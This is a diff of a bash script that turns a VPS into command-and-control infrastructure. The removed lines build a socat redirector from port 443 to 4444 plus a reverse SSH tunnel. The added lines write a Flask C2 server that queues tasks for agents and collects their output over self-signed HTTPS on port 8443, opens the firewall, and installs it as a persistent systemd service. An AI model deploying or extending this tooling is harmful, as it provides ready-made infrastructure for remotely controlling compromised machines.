@@ -1,50 +1,87 @@
 #!/bin/bash
 
-set -e
+echo "[*] Updating packages..."
+sudo apt update && sudo apt upgrade -y
 
-echo "[*] Updating package list..."
-sudo apt update
+echo "[*] Installing Python3, pip, and Flask..."
+sudo apt install -y python3 python3-pip ufw
+pip3 install flask
 
-echo "[*] Installing socat..."
-sudo apt install -y socat
+echo "[*] Creating C2 directory..."
+mkdir -p ~/c2_server/certs
+cd ~/c2_server
 
-echo "[*] Enabling IP forwarding (just in case)..."
-echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
-sudo sysctl -p
+echo "[*] Writing C2 server script..."
+cat > server.py << 'EOF'
+from flask import Flask, request
+import json, os
 
-echo "[*] Setting up systemd service to forward port 443 → 4444..."
+app = Flask(__name__)
+DB_FILE = "task_db.json"
 
-sudo tee /etc/systemd/system/c2-proxy.service > /dev/null <<EOF
+if not os.path.exists(DB_FILE):
+    with open(DB_FILE, "w") as f:
+        json.dump({}, f)
+
+def load_tasks():
+    with open(DB_FILE) as f:
+        return json.load(f)
+
+def save_tasks(data):
+    with open(DB_FILE, "w") as f:
+        json.dump(data, f)
+
+@app.route("/task/<agent_id>", methods=["GET"])
+def get_task(agent_id):
+    tasks = load_tasks()
+    return tasks.pop(agent_id, "") or ""
+
+@app.route("/result/<agent_id>", methods=["POST"])
+def post_result(agent_id):
+    print(f"[+] Result from {agent_id}: {request.form['output']}")
+    return "OK"
+
+@app.route("/set/<agent_id>", methods=["POST"])
+def set_task(agent_id):
+    tasks = load_tasks()
+    tasks[agent_id] = request.form["task"]
+    save_tasks(tasks)
+    return "Task set"
+
+if __name__ == "__main__":
+    context = ("certs/cert.pem", "certs/key.pem")
+    app.run(host="0.0.0.0", port=8443, ssl_context=context)
+EOF
+
+echo "[*] Generating self-signed HTTPS certificate..."
+openssl req -new -x509 -days 365 -nodes \
+    -out certs/cert.pem -keyout certs/key.pem \
+    -subj "/C=IN/ST=RedTeam/L=CyberOps/O=C2Project/CN=$(curl -s ifconfig.me)"
+
+echo "[*] Configuring UFW to allow port 8443..."
+sudo ufw allow 8443
+sudo ufw --force enable
+
+echo "[*] Creating systemd service for C2..."
+cat | sudo tee /etc/systemd/system/c2server.service > /dev/null << EOF
 [Unit]
-Description=C2 TCP Proxy (443 → 4444)
+Description=Custom C2 Flask Server
 After=network.target
 
 [Service]
-ExecStart=/usr/bin/socat TCP-LISTEN:443,fork TCP:localhost:4444
+ExecStart=/usr/bin/python3 /home/ubuntu/c2_server/server.py
+WorkingDirectory=/home/ubuntu/c2_server
 Restart=always
-RestartSec=3
+User=ubuntu
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-echo "[*] Enabling and starting the service..."
+echo "[*] Enabling and starting C2 service..."
+sudo systemctl daemon-reexec
 sudo systemctl daemon-reload
-sudo systemctl enable c2-proxy
-sudo systemctl start c2-proxy
+sudo systemctl enable c2server
+sudo systemctl start c2server
 
-echo "[*] Verifying socat listener is up..."
-sleep 2
-sudo ss -tuln | grep ":443" || echo "[!] Warning: socat not listening on port 443"
-
-echo "[*] (Optional) Adding UFW rule to allow port 443..."
-if command -v ufw &> /dev/null; then
-    sudo ufw allow 443/tcp || echo "[!] UFW may be inactive"
-else
-    echo "[!] Skipping UFW (not installed)"
-fi
-
-echo -e "\n✅ Done! This VPS is now acting as a C2 redirector."
-echo "Any TCP connection to port 443 will be forwarded to localhost:4444"
-echo "From your local machine, open a reverse tunnel using:"
-echo "  ssh -N -R 4444:localhost:4444 <you>@<vps-ip>"
+echo "[✔] C2 Server is now running on https://$(curl -s ifconfig.me):8443"
